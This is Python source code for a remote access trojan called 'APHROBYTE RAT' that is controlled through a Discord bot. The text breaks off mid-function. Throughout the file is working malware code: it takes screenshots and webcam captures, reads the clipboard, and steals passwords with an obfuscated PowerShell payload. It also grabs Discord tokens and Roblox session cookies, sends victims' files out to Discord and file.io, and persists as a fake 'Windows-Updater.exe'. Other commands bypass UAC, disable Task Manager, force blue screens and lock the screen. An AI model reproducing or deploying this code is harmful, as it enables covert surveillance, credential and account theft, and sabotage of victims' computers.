import pyautogui, cv2, time, threading, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil
from discord.ext import commands
from ctypes import Structure, windll, c_uint, sizeof, byref

client = commands.Bot(command_prefix='!',intents=discord.Intents.all())
client.remove_command("help")

### CONFIGURATION

token = "{token}"
guild_id = "{guild_id}"
annc_channel_id = "{announc}"
pass_channel_id = "{passw}"
tokens_channel_id = "{tokens}"
roblosecurity_channel_id = "{roblosec}"
clientid = ""
autostart = True
startup_enabled = False
keylogger = ""
cookies = ""

### CODE

installationpath = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))

def admincheck():
    val = ctypes.windll.shell32.IsUserAnAdmin()
    if val < 1:
        return False
    elif val > 0:
        return True


help_menu = f"""
Available commands for **{os.getlogin()}** :

**!help** - Shows this message
**!startup** - Adds the file to startup.
**!exit** - Stop the RAT from working.
**!usagelist** - Returns a list of active users.
**!admin_check** - Checks if you are admin on target computer.
**!bypass_uac** - Attempts to bypass UAC to get admin privileges.

`-----SURVEILLANCE-----`

**!screenshot** - Sends a screenshot of the target machine
**!idletime** - Displays for how long the user has been AFK
**!webcam_capture** - Capture a picture of the webcam.
**!tasklist** - Returns a list of active tasks.

`-----FILE MANAGEMENT-----`

**!chdir** - Changes the current directory. **!chdir <** to go back one directory.
**!chdisk** - Changes the current disk. (E, C, D, etc.)
**!ls** - Displays all items in the current directory.
**!download** - Downloads a file from the specified path.
**!upload** - Uploads a file to the specified path.
**!taskkill** - Kills the specified task.
**!startfile** - Starts a file.
**!delfile** - Deletes a file.
**!hidefile** \ **!unhidefile** - Hides/unhides a file.

`-----INFORMATION GATHERING-----`

**!whois** - Prints the user"s name
**!getip** - Gets the current user's IP address
**!clipboard** - Returns a string of the user's clipboard.
**!stealpasswords** - Steal all the passwords from the device.
**!grabroblox** - Grabs the user's Roblox account cookie.
**!hardware_list** - Lists the user's hardware on newlines.
"""

help_menu2 = """
**!grabdiscord** - Fetches the user's Discord account token.

`-----SANCTIONING-----`

**!bsod** - Blue screens the computer.
**!disabletaskmgr** \ **!enabletaskmanager** - Disable/enable task manager.
**!logoff** - Logs the user off.
**!shutdown** - Shuts the user's PC off.
**!restart** - Restarts the user's PC.
**!blockscreen** - Blocks the user's screen. (IRREVERSIBLE UNTIL USER RESTARTS)
**!critproc** - Makes the RAT a critical process, meaning if it's task killed the user will get a BSOD.
**!screenflip** - Rotates the user's screen 90 degrees.

`-----FUN-----`

**!write** - Writes a sentence then presses enter.
**!setclipboard** - Sets the clipboard to the specified string of text.
**!forcedesktop** - Sends the user on desktop automatically.
**!messmouse** - Shakes the user's cursor when they try to move the mouse, run this command again to stop.
**!opensite** - Opens a site on the user's browser.
**!key_press** - Press a key.
**!showtaskbar** \ **!hidetaskbar**

`-----COMMUNICATION-----`

**!questionmsg** - Sends the user a question message.
**!warningmsg** - Sends the user a warning message.
**!errormsg** - Sends the user an error message.
**!infomsg** - Sends the user an informative message.

```* You need to specify the usage ID after every command. Arguments come after.

Example : !write (usage-id) (sentence) => !write 123456 Test sentence
          !questionmsg (usage-id) (message) => !questionmsg 123456 Test Message
```
"""

idedd = ""

chars = "1234567890"
clientid = "".join(random.sample(chars, 6))

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint)
    ]

def shell(command):
    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    global status
    status = "ok"
    return output.stdout.decode('CP437').strip()

def shellcommand(command):
    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    global status
    status = "ok"
    string = output.stdout.decode('CP437').strip()
    f = open("shell.txt", "a")
    r = open("shell.txt", "w")
    r.write(string)

def get_idle_duration():
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 100.0

def takeScreenshot():
    temp = os.getenv('temp')
    sc = pyautogui.screenshot()
    sc.save(temp + "\screenshot.png")

def disable_task_manager():
    registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name = "DisableTaskMgr"
    value = 1
    
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
        return True
    except WindowsError as e:
        return e

def enable_task_manager():
    registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name = "DisableTaskMgr"
    value = 0
    
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
        return True
    except WindowsError as e:
        return e

@client.event
async def on_ready():
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        ldata = json.loads(url.read().decode())
        cflag = ldata['country_code']
        ipaddress = ldata['IPv4']

    user = os.getlogin()
    host_id = socket.gethostname()
    #guild = client.get_guild(int(guild_id))
    channel = client.get_channel(int(annc_channel_id))
    takeScreenshot()
    path = f"{os.getenv('temp')}\screenshot.png"
    await channel.send(f"""
||@everyone|| The RAT has sniped :flag_{cflag.lower()}: **{user}** :flag_{cflag.lower()}: with desktop ID **{host_id}**.

``` APHROBYTE RAT v1.9.1 | {client.user.name} | RIOT ADMINISTRATION ```

:skull_crossbones: `->` IP Address : ||{ipaddress}|| <- :flag_{cflag.lower()}:
:skull_crossbones: `->` Admin privileges : **{admincheck()}**
:skull_crossbones: `->` Auto startup : **{autostart}**
:skull_crossbones: `->` OS : **{platform.system()} {platform.release()}**
:skull_crossbones: `->` Usage ID : ||{clientid}||

``` APHROBYTE RAT v1.9.1 | {client.user.name} | RIOT ADMINISTRATION ```

Help menu : **!help ||{clientid}||**
Get list of active users : **!usagelist**

RAT installed in : `{installationpath}`

:point_down: **__USER SCREEN__** :point_down:
""", file=discord.File(path))
    os.remove(path)
    print(f'{client.user} is now online! Clientid {clientid}')
    


@client.command()
async def help(ctx, *, usid):
    if usid == clientid:
        await ctx.send(help_menu)
        await ctx.send(help_menu2)

@client.command()
async def screenshot(ctx, *, usid):
    if usid == clientid:
        takeScreenshot()
        path = f"{os.getenv('temp')}\screenshot.png"
        await ctx.send(f"Surveillance SS -> **{os.getlogin()}**:",file=discord.File(path))
        os.remove(path)
    
@client.command()
async def write(ctx, usid, *, sentence):
    if usid == clientid:
        pyautogui.write(sentence)
        pyautogui.press('enter')
        await ctx.send(f"The user has now written **{sentence}** on their computer.")

@client.command()
async def whois(ctx, *, usid):
    if usid == clientid:
        user = os.getlogin()
        await ctx.send(f"You are on **{user}**'s computer")

@client.command()
async def getip(ctx, *, usid):
    if usid == clientid:
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            ldata = json.loads(url.read().decode())
            cflag = ldata['country_code']
            ipaddress = ldata['IPv4']
        await ctx.send(f"**{os.getlogin()}**'s IP is :flag_{cflag.lower()}: **{ipaddress}** :flag_{cflag.lower()}:")

@client.command()
async def exit(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f"The RAT process has been killed on **{os.getlogin()}**'s machine.")
        sys.exit()

@client.command()
async def bsod(ctx, *, usid):
    if usid == clientid:
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await ctx.send("BSOD failed with unexpected error.")
        else:
            await ctx.send(f"{os.getlogin()} has been blue screened.")

@client.command()
async def startup(ctx, *, usid):
    if usid == clientid:
        if startup_enabled != True:
            path = sys.argv[0]
            isexe = False
            if (sys.argv[0].endswith("exe")):
                isexe = True
            if isexe:
                if (sys.argv[0].endswith("exe")):
                    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
                    if not os.path.exists(backdoor_location):
                        shutil.copyfile(sys.executable, backdoor_location)
                        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
                await ctx.send(f"Added file to startup for **{os.getlogin()}**")
        elif startup_enabled == True:
            await ctx.send(f"Startup already enabled for **{os.getlogin()}**")

@client.command()
async def disabletaskmgr(ctx, *, usid):
    if usid == clientid:
        value = disable_task_manager()
        if value == True:
            await ctx.send(f"Task manager has been disabled for **{os.getlogin()}**")
        else:
            await ctx.send("Insufficient permissions.")

@client.command()
async def enabletaskmgr(ctx, *, usid):
    if usid == clientid:
        value = enable_task_manager()
        if value == True:
            await ctx.send(f"Task manager has been enabled for **{os.getlogin()}**")
        else:
            await ctx.send("Insufficient permissions.")

@client.command()
async def idletime(ctx, *, usid):
    if usid == clientid:
        idle_duration = str(get_idle_duration())
        await ctx.send(f'Idletime for **{os.getlogin()}**: {idle_duration}')

@client.command()
async def clipboard(ctx, *, usid):
    if usid == clientid:
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = value.decode()
            user32.CloseClipboard()
        await ctx.send(f"Clipboard content for **{os.getlogin()}** is : \n\n" + str(body))

@client.command()
async def stealpasswords(ctx, *, usid):
    if usid == clientid:
        postchannel = client.get_channel(int(pass_channel_id))
        temp = os.getenv('temp')
        passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
        f4 = open(temp + r"\passwords.txt", 'w')
        f4.write(str(passwords))
        f4.close()
        file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
        await ctx.send(f":skull_crossbones: Started fishing **{os.getlogin()}**'s passwords...")
        await postchannel.send(f"{ctx.author.mention} Passwords for **{os.getlogin()}** ", file=file)
        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s passwords have been sent in <#{pass_channel_id}>")
        os.remove(temp + r"\passwords.txt")


@client.command()
async def logoff(ctx, *, usid):
    if usid == clientid:
        os.system("shutdown /l /f")
        await ctx.send(f"**{os.getlogin()}** logged off.")

@client.command()
async def shutdown(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f"**{os.getlogin()}**'s PC has been shut down.")
        os.system("shutdown /p")

@client.command()
async def setclipboard(ctx, usid, *, clipboard):
    if usid == clientid:
        s1 = pyperclip.copy(clipboard)
        s2 = pyperclip.paste()
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = value.decode()
            user32.CloseClipboard()
        await ctx.send(f'Successfully set the clipboard to **{str(body)}**')

@client.command()
async def forcedesktop(ctx, *, usid):
    if usid == clientid:
        pyautogui.keyDown('winleft')
        pyautogui.press('d')
        pyautogui.keyUp('winleft')
        await ctx.send(f"Sent **{os.getlogin()}** to the desktop.")

@client.command()
async def webcam_capture(ctx, *, usid):
    if usid == clientid:
        camera_count = cv2.getBuildInformation().count("Video I/O")
        if camera_count == 0:
            await ctx.send(f"No cameras found for **{os.getlogin()}**.")
            return
            
        cam_number = 0
        for camera_index in range(camera_count):
            camera = cv2.VideoCapture(camera_index)
            success, frame = camera.read()
            if success:
                cam_number = cam_number + 1
                image_path = f"camera_{camera_index}.jpg"
                cv2.imwrite(image_path, frame)

                with open(image_path, "rb") as file:
                    picture = discord.File(file, filename=image_path)
                    embed = discord.Embed(color=discord.Color.green())
                    embed.set_image(url=f"attachment://{image_path}")
                    await ctx.send(content=f"**{os.getlogin()}**'s webcam - **Camera {str(cam_number)}**",embed=embed, file=picture)

                os.remove(image_path)

            camera.release()
        if cam_number == 0:
            await ctx.send(f"**{os.getlogin()}** has no webcam available.")
    
def on_closing():
    pass

def screenblock():
    box = tk.Tk()
    box.attributes('-fullscreen', True)
    box.attributes("-topmost", True)
    box.configure(background='black')
    box.protocol("WM_DELETE_WINDOW", on_closing)
    box.mainloop()

@client.command()
async def blockscreen(ctx, *, usid):
    if usid == clientid:
        threading.Thread(target=screenblock, daemon=True).start()
        await ctx.send(f"**{os.getlogin()}**'s screen has been blocked.")
        

mousemess = False

def StartMouseMess():
    global mousemess
    while mousemess:
        x=random.randint(600, 700)
        y=random.randint(600, 700)
        pyautogui.moveTo(x, y, 3)
        time.sleep(1)

@client.command()
async def messmouse(ctx, *, usid):
    if usid == clientid:
        global mousemess
        if mousemess == False:
            mousemess = True
            threading.Thread(target=StartMouseMess,daemon=True).start()
            await ctx.send(f"Started messing **{os.getlogin()}**'s mouse.")
        elif mousemess == True:
            mousemess = False
            await ctx.send(f"Stopped messing **{os.getlogin()}**'s mouse.")
        

@client.command()
async def usagelist(ctx):
    list_usage = f"Active : **{os.getlogin()}** with desktop ID **{socket.gethostname()}** and usage ID **{clientid}**. Admin privileges : **{admincheck()}** `v1.9.1`"
    await ctx.send(list_usage)

@client.command()
async def questionmsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** a question message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        response = tkinter.messagebox.askyesno("Question", message, parent=root)
        if response:
            await ctx.send(f"**{os.getlogin()}** has replied with **Yes** to your question which was `{message}`")
            root.destroy()
        else:
            await ctx.send(f"**{os.getlogin()}** has replied with **No** to your question which was `{message}`")
            root.destroy()

@client.command()
async def warningmsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** a warning message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        tk.messagebox.showwarning(title='Warning', message=message, parent=root)
        await ctx.send(f"**{os.getlogin()}** saw the warning sent which was `{message}`")
        root.destroy()

@client.command()
async def errormsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** an error message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        tk.messagebox.showerror(title='Error', message=message, parent=root)
        root.destroy()

@client.command()
async def infomsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** an informative message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        tk.messagebox.showinfo(title='Information', message=message, parent=root)
        await ctx.send(f"**{os.getlogin()}** acknowledged the informative message sent which was `{message}`")
        root.destroy()

@client.command()
async def opensite(ctx, usid, *, website):
    if usid == clientid:
        os.system(f"start {website}")
        await ctx.send(f"Opened **{website}** for **{os.getlogin()}**")

@client.command()
async def admin_check(ctx, usid):
    value = admincheck()
    if usid == clientid:
        if value:
            await ctx.send(f"You have admin privileges against **{os.getlogin()}**")
        elif not value:
            await ctx.send(f"You do not have admin privileges against **{os.getlogin()}**")

def cookieLogger():

    data = []

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    
    



@client.command()
async def grabroblox(ctx, *, usid):
    cookies = cookieLogger()
    roblox_cookie = cookies[1]
    if usid == clientid:
        postchannel = client.get_channel(int(roblosecurity_channel_id))
        await ctx.send(f":skull_crossbones: Started searching for **{os.getlogin()}**'s ROBLOSECURITY")
        await postchannel.send(f"""
{ctx.author.mention} .ROBLOSECURITY for **{os.getlogin()}** : 
```
{roblox_cookie}
```

Bypass IP lock with https://rbxfresh.com/
""")
        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s cookies have been sent in <#{roblosecurity_channel_id}>")

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def token_grab():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += f'No tokens found.\n'

        message += '```'

    try:
        return message
    except:
        pass

@client.command()
async def grabdiscord(ctx, *, usid):
    if usid == clientid:
        postchannel = client.get_channel(int(tokens_channel_id))
        await ctx.send(f":skull_crossbones: Searching for **{os.getlogin()}**'s account tokens...")
        await postchannel.send(f"{ctx.author.mention} Account tokens for **{os.getlogin()}** : \n{token_grab()}")
        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s account tokens have been sent in <#{tokens_channel_id}>")
        

@client.command()
async def chdir(ctx, usid, *, directory):
    if usid == clientid:
        if directory != "<":
            try:
                os.chdir(f"{os.getcwd()}\\{directory}")
                await ctx.send(f"Directory changed to **{directory}** for **{os.getlogin()}**")
            except: await ctx.send(f"Error accessing directory for **{os.getlogin()}**")
        elif directory == "<":
            try:
                os.chdir('..')
                await ctx.send(f"Moved one directory back for **{os.getlogin()}** -> **{os.getcwd()}**")
            except: await ctx.send(f"Error moving one directory back for **{os.getlogin()}**")

@client.command()
async def ls(ctx, *, usid):
    if usid == clientid:
        output = subprocess.getoutput('dir')
        if output:
            result = output
            numb = len(result)
        if numb < 1:
            await ctx.send(f"Error displaying current directory for **{os.getlogin()}**.")
        elif numb > 1:
            temp = (os.getenv('TEMP'))
            if os.path.isfile(temp + r"\output22.txt"):
                 os.system(r"del %temp%\output22.txt /f")
            f1 = open(temp + r"\output22.txt", 'a')
            f1.write(result)
            f1.close()
            file = discord.File(temp + r"\output22.txt", filename="output22.txt")
            await ctx.send(f"Current directory items for **{os.getlogin()}**:\n\n-", file=file)
        else:
            await ctx.send(f"Current directory items for **{os.getlogin()}**:\n\n" + result)
                
@client.command()
async def download(ctx, usid, *, path):
    if usid == clientid:
        try:
            filename = path
            check2 = os.stat(filename).st_size
        except: await ctx.send(f"File path doesn't exist.")
        if check2 > 7340032:
            try:
                await ctx.send(f"Please wait while downloading the file from **{os.getlogin()}**...")
                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                await ctx.send(f"Success downloading file from **{os.getlogin()}**. Download link : {response}")
            except: await ctx.send(f"Access denied.")
        else:
            try:
                file = discord.File(path, filename=path)
                await ctx.send(f"Success downloading file from **{os.getlogin()}**.", file=file)
            except: await ctx.send(f"Access denied.")

@client.command()
async def upload(ctx, usid, *, path):
    if usid == clientid:
        if ctx.message.attachments:
            try:
                await ctx.message.attachments[0].save(path)
                await ctx.send(f"Saved attachment for **{os.getlogin()}** in **{path}**")
            except WindowsError as e:
                await ctx.send(f"System error uploading attachment in **{path}** for **{os.getlogin()}**")

@client.command()
async def bypass_uac(ctx, *, usid):
    if usid == clientid:
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        if isAdmin():
            await ctx.send(f"You already have admin privileges against **{os.getlogin()}**!")
        else:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            await ctx.send(f"Started UAC Bypass process on **{os.getlogin()}**")
            isexe=False
            if (sys.argv[0].endswith("exe")):
                isexe=True
            if not isexe:
                test_str = sys.argv[0]
                current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                cmd2 = current_dir
                create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            else:
                test_str = sys.argv[0]
                current_dir = test_str
                cmd2 = current_dir
                create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")  
            remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
            os.system(remove_reg)

@client.command()
async def startfile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            os.startfile(filepath)
            await ctx.send(f"**{filepath}** has been executed for **{os.getlogin()}**.")
        except WindowsError as e:
            await ctx.send(f"**{filepath}** cannot be executed for **{os.getlogin()}**.")

@client.command()
async def tasklist(ctx, *, usid):
    if usid == clientid:
        if 1==1:
            result = subprocess.getoutput("tasklist")
            numb = len(result)
            if numb < 1:
                await ctx.send(f"Error displaying active tasks for **{os.getlogin()}**")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                if os.path.isfile(temp + r"\olist.txt"):
                    os.system(r"del %temp%\olist.txt /f")
                f1 = open(temp + r"\olist.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File(temp + r"\olist.txt", filename="olist.txt")
                await ctx.send(f"Active tasks for **{os.getlogin()}** :", file=file)
            else:
                await ctx.send(f"Active tasks for **{os.getlogin()}** : " + result) 

@client.command()
async def taskkill(ctx, usid, *, proc):
    if usid == clientid:
        kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f" 
        os.system(kilproc)
        process_name = proc
        call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
        output = subprocess.check_output(call).decode()
        last_line = output.strip().split('\r\n')[-1]
        done = (last_line.lower().startswith(process_name.lower()))
        if done == False:
            await ctx.send(f"Killed the **{proc}** task for **{os.getlogin()}**")
        elif done == True:
            await ctx.send(f"Error killing the **{proc}** task  for **{os.getlogin()}**")

@client.command()
async def delfile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            os.remove(filepath)
            await ctx.send(f"Deleted **{filepath}** from **{os.getlogin()}**")
        except WindowsError as e:
            await ctx.send(f"System error trying to delete **{filepath}** from **{os.getlogin()}**")

@client.command()
async def setwp(ctx, *, usid):
    if usid == clientid:
        path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
        await ctx.message.attachments[0].save(path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
        await ctx.send(f"Changed wallpaper for **{os.getlogin()}**")

@client.command()
async def critproc(ctx, *, usid):
    if usid == clientid:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
            await ctx.send(f"Successfully set the task to a critical process for **{os.getlogin()}**.")
        else:
            await ctx.send(f"Insufficient permissions to critproc for **{os.getlogin()}**")

@client.command()
async def hidefile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            p = os.popen('attrib +h ' + filepath)
            t = p.read()
            p.close()
            await ctx.send(f"**{filepath}** has been hidden for **{os.getlogin()}**")
        except:
            await ctx.send(f"Error hiding **{filepath}** for **{os.getlogin()}**")
            
@client.command()
async def unhidefile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            p = os.popen('attrib -h ' + filepath)
            t = p.read()
            p.close()
            await ctx.send(f"**{filepath}** is now visible for **{os.getlogin()}**")
        except:
